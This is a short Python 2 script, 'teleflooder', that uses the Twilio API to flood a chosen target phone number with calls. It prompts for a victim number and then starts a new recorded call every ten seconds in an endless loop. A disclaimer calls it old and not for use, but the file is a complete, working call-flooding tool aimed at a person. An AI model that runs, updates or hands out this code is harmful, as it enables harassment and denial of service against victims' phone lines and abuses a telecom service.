







# PLEASE READ THIS FIRST
# This code is really old and is only here for nostalgia/historical purposes
# It's also Python 2.... so yeah, don't use it!












### teleflooder
### Utilize Twilio API to flood a phone number with calls
### Version 0.2.0
### GNU GPLv3 Licensed

import os
import thread
import time
from twilio.rest import Client


## Makes a call with Twilio to the target number using the source number
def make_call(target, source):
    call = client.calls.create(
        record=True,
        to=target,
        from_=source,
        url="https://handler.twilio.com/twiml/EH83ede6e13d3f59c05a260b6b72dc407f"
    )
    print "Call placed"

## Twilio SID and Auth token. Store these as environment vars for security. Or, if you are modifying the script for personal use, simply enter these here as strings.
account_sid = os.environ["TWILIO_ACCOUNT_SID"]
auth_token  = os.environ["TWILIO_AUTH_TOKEN"]

## Create a new Client object for authentication to Twilio
client = Client(account_sid, auth_token)

phonelogo = '''
#################################################################
##                                                             ##
##                                                             ##
##           ####                                              ##
##         #########           * * * teleflooder * * *         ##
##       #####  ######                                         ##
##     #####       #####                                       ##
##   #####          ######                                     ##
##   ####             ######                                   ##
##  ####                #####                                  ##
##  ####                  ####                                 ##
##  ####                 ####                                  ##
##   ####              #####                                   ##
##   ####            #####                                     ##
##    ####         #####                                       ##
##     ####        #####         Licensed under GNU GPLv3      ##
##     #####        #####                                      ##
##       ####         #####                                    ##
##        ####          #####                                  ##
##         #####         ######              ####              ##
##          #####          ######          #########           ##
##            #####          ######      #####  ######         ##
##             ######           ###### #####       #####       ##
##               ######           ########           #####     ##
##                 ######            ###               #####   ##
##                   ######                              ####  ##
##                     #######                            ###  ##
##                       #######                        ####   ##
##                          #######                   #####    ##
##                              #########            #####     ##
##                                #####################        ##
##                                     ##############          ##
##                                                             ##
##                                                             ##
#################################################################
'''

print phonelogo

## Input your Twilio number (coming soon: multiple numbers)
mynumber = raw_input("What is your Twilio number?")

## Input the number of your target
badnumber = raw_input("What is the number you want to flood?")

## Accept user input to run the flooder
raw_input("Press ENTER to run the flooder...")

## Run the script forever until the user quits
while True:
    ## Make a new thread for the call to run in, allowing the user to run multiple calls
	thread.start_new_thread(make_call, (badnumber, mynumber))
	time.sleep(10)
